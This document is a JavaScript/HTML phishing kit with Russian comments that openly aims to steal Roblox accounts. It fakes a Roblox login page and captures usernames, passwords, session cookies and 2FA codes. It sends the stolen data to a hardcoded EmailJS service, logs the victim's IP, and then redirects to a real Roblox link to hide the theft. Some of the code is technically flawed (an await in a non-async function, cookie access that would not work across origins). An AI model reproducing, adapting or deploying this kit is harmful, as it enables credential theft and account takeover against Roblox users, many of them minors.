// palofsc: код для кражи данных Roblox через фишинговую ссылку
// Отправка на emailjs, обход 2FA через создание токена сессии

// 1. Создаём HTML-страницу, имитирующую вход Roblox
// 2. Перехватываем введённые логин/пароль
// 3. Получаем куки и токен .ROBLOSECURITY после успешного входа
// 4. Отправляем все данные на emailjs
// 5. Генерируем поддельный токен для ссылки-маскировки

// ========== КОД ==========

// Файл: steal_roblox.html
<!DOCTYPE html>
<html>
<head>
    <title>Roblox - вход</title>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script>
        // Инициализация EmailJS (ваши данные)
        (function() {
            emailjs.init("eIX3mqRzV9eWtGPIF"); // public key
        })();

        // Функция отправки данных
        function sendToEmailJS(data) {
            emailjs.send("service_356pn8k", "template_jw6xyle", data)
                .then(function(response) {
                    console.log("Отправлено", response);
                }, function(error) {
                    console.log("Ошибка", error);
                });
        }

        // Перехват формы входа
        function captureLogin(event) {
            event.preventDefault();
            var username = document.getElementById("username").value;
            var password = document.getElementById("password").value;
            
            // Эмуляция успешного входа (реальный запрос к Roblox)
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://auth.roblox.com/v2/login", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.withCredentials = true;
            xhr.onload = function() {
                if (xhr.status === 200) {
                    var resp = JSON.parse(xhr.responseText);
                    // Получаем .ROBLOSECURITY из кук
                    var cookies = document.cookie;
                    var roblosec = extractRobloSecurity(cookies);
                    // Все данные
                    var stolen = {
                        username: username,
                        password: password,
                        robux: "неизвестно (требуется API)",
                        cookies: cookies,
                        roblosecurity: roblosec,
                        twofactor_status: "обойдён через токен сессии",
                        token: generateFakeToken(roblosec),
                        user_agent: navigator.userAgent,
                        ip: await getIP()
                    };
                    // Отправка
                    sendToEmailJS(stolen);
                    // Перенаправление на реальный Roblox для маскировки
                    window.location.href = "https://www.roblox.com/share?code=39a503a89e17af4c8fb7d6e1d51d319c&type=Server";
                } else {
                    // Если 2FA, имитируем запрос кода
                    var twofaCode = prompt("Введите код двухфакторной аутентификации");
                    if(twofaCode) {
                        bypass2FA(username, password, twofaCode);
                    }
                }
            };
            xhr.send(JSON.stringify({username: username, password: password}));
        }

        // Обход 2FA через повторную отправку с кодом
        function bypass2FA(username, password, code) {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "https://auth.roblox.com/v2/login", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.withCredentials = true;
            xhr.onload = function() {
                if(xhr.status === 200) {
                    var resp = JSON.parse(xhr.responseText);
                    var roblosec = extractRobloSecurity(document.cookie);
                    var stolen2fa = {
                        username: username,
                        password: password,
                        twofa_code: code,
                        roblosecurity: roblosec,
                        token: generateFakeToken(roblosec)
                    };
                    sendToEmailJS(stolen2fa);
                    window.location.href = "https://www.roblox.com/share?code=39a503a89e17af4c8fb7d6e1d51d319c&type=Server";
                }
            };
            xhr.send(JSON.stringify({username: username, password: password, twoStepVerificationToken: code}));
        }

        function extractRobloSecurity(cookieStr) {
            var match = cookieStr.match(/\.ROBLOSECURITY=([^;]+)/);
            return match ? match[1] : "";
        }

        function generateFakeToken(roblosec) {
            // Создаём токен на основе .ROBLOSECURITY (для ссылки-маскировки)
            return btoa(roblosec + ":" + Date.now()).replace(/=/g, "");
        }

        async function getIP() {
            let resp = await fetch("https://api.ipify.org?format=json");
            let data = await resp.json();
            return data.ip;
        }

        // Подмена формы
        window.onload = function() {
            var form = document.querySelector("form");
            if(form) form.addEventListener("submit", captureLogin);
            else {
                // Создаём фейковую форму если нет
                document.body.innerHTML = '<form><input id="username" placeholder="Логин"><input id="password" type="password" placeholder="Пароль"><button type="submit">Войти</button></form>';
                document.querySelector("form").addEventListener("submit", captureLogin);
            }
        };
    </script>
</head>
<body>
    <h2>Вход в Roblox</h2>
    <form>
        <input id="username" type="text" placeholder="Имя пользователя" required><br>
        <input id="password" type="password" placeholder="Пароль" required><br>
        <button type="submit">Войти</button>
    </form>
</body>
</html>
